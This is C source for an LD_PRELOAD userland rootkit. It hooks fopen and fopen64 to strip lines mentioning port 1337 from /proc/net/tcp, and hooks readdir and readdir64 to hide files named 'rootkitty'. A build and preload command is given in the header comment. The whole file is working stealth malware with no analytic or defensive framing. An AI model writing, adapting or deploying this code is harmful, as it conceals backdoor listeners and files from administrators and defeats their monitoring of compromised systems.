//////////////////////////////////////////////////////////////
// gcc fopen.c -o fopen.so -fPIC -shared -ldl #-D_GNU_SOURCE//
//                 LD_PRELOAD=./strcmp.so ./file            //
//////////////////////////////////////////////////////////////
#include <string.h>
#include <dirent.h>
#include <stdio.h>
#include <dlfcn.h>
#include <string.h>

#define SECRET_FILE "rootkitty"
#define _GNU_SOURCE

FILE *(*orig_fopen)(const char *pathname, const char *mode);
FILE *(*orig_fopen64)(const char *pathname, const char *mode);
FILE *fopen(const char *pathname, const char *mode)
{
	orig_fopen = dlsym(RTLD_NEXT, "fopen");
	char *ptr_tcp = strstr(pathname, "/proc/net/tcp");
	FILE *fp;

	if (ptr_tcp != NULL)
	{
		char line[256];
		FILE *temp = tmpfile();
		fp = orig_fopen(pathname, mode);
		while (fgets(line, sizeof(line), fp))
		{
			char *listener = strstr(line, "0539");
			if (listener != NULL)
			{
				continue;
			}
			else
			{
				fputs(line, temp);
			}
		}
		return temp;
	}
	fp = orig_fopen(pathname, mode);
	return fp;
}

FILE *fopen64(const char *pathname, const char *mode)
{
	orig_fopen64 = dlsym(RTLD_NEXT, "fopen64");
	char *ptr_tcp = strstr(pathname, "/proc/net/tcp");
	FILE *fp;

	if (ptr_tcp != NULL)
	{
		char line[256];
		printf("mimi");
		FILE *temp = tmpfile();
		fp = orig_fopen64(pathname, mode);
		while (fgets(line, sizeof(line), fp))
		{
			char *listener = strstr(line, "0539");
			if (listener != NULL)
			{
				continue;
			}
			else
			{
				fputs(line, temp);
			}
		}
		return temp;
	}
	fp = orig_fopen64(pathname, mode);
	return fp;
}
// write hooking

struct dirent *readdir(DIR *dirp)
{
	struct dirent *(*original_readdir)(DIR *);
	struct dirent *ret;

	original_readdir = dlsym(RTLD_NEXT, "readdir");
	while ((ret = original_readdir(dirp)))
	{
		if (strstr(ret->d_name, SECRET_FILE) == 0)
			break;
	}
	return ret;
}

struct dirent *readdir64(DIR *dirp)
{
	struct dirent *(*original_readdir64)(DIR *);
	struct dirent *ret;

	original_readdir64 = dlsym(RTLD_NEXT, "readdir64");
	while ((ret = original_readdir64(dirp)))
	{
		if (strstr(ret->d_name, SECRET_FILE) == 0)
			break;
	}
	return ret;
}
